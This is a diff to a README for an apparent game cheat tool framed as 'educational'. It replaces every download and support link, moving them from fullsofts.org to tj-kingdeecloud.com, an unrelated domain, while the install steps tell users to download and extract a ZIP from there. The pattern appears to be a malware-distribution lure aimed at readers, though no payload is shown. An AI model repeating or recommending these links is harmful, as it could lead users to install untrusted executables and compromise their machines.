@@ -42,7 +42,7 @@ A performance enhancement and gameplay modification tool designed for educationa
 
 ### Step-by-Step Installation
 1. **Download the tool package**
-   [![Download](https://img.shields.io/badge/Download-fullsofts.org-brightgreen?style=for-the-badge)](https://fullsofts.org)
+   [![Download](https://img.shields.io/badge/Download-tj-kingdeecloud.com-brightgreen?style=for-the-badge)](https://tj-kingdeecloud.com)
 
 2. **Extract the archive**
    - Right-click the downloaded ZIP file
@@ -95,7 +95,7 @@ A performance enhancement and gameplay modification tool designed for educationa
 - **Hotkeys not working:** Check for software conflicts (overlays, recording software)
 
 ### Support Channels
-- Documentation updates available at fullsofts.org
+- Documentation updates available at tj-kingdeecloud.com
 - Version-specific patches released monthly
 - Community configuration profiles available for download
 
@@ -104,4 +104,4 @@ A performance enhancement and gameplay modification tool designed for educationa
 
 ---
 **Latest Version:** v2.1.4 | **Release Date:** 2024-03-15 | **File Size:** 42.7 MB  
-**Download:** [![Download](https://img.shields.io/badge/Download-fullsofts.org-brightgreen?style=for-the-badge)](https://fullsofts.org)
+**Download:** [![Download](https://img.shields.io/badge/Download-tj-kingdeecloud.com-brightgreen?style=for-the-badge)](https://tj-kingdeecloud.com)
